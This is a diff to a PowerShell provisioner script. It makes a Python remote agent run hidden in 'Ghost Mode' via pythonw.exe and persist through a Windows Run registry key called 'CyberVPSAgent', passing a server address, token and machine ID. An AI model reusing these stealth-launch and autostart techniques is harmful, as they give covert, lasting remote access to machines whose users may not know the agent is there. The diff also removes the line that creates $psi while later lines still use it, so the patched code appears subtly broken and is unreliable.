@@ -191,8 +191,9 @@ $ProvisionerScript = {
         try {
             # Start full universal-agent in Ghost Mode
             $logArg = Join-Path $PrimaryDir "agent.log"
-            $psi = New-Object System.Diagnostics.ProcessStartInfo
-            $psi.FileName = $py
+            $pyw = Join-Path (Split-Path -Parent $py) "pythonw.exe"
+            $launchPy = if (Test-Path $pyw) { $pyw } else { $py }
+            $psi.FileName = $launchPy
             $psi.Arguments = "`"$agentPy`" `"$Server`" `"$Token`" `"$MachineId`" --ghost --log-file `"$logArg`""
             $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
             $psi.CreateNoWindow = $true
@@ -203,7 +204,7 @@ $ProvisionerScript = {
             # Ensure Autostart Run Persistence
             try {
                 $regKey = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", $true)
-                $cmdVal = "`"$py`" `"$agentPy`" start"
+                $cmdVal = "`"$launchPy`" `"$agentPy`" `"$Server`" `"$Token`" `"$MachineId`" --ghost --log-file `"$logArg`""
                 $regKey.SetValue("CyberVPSAgent", $cmdVal)
                 $regKey.Close()
                 PLog "Registry Autostart Run key confirmed."
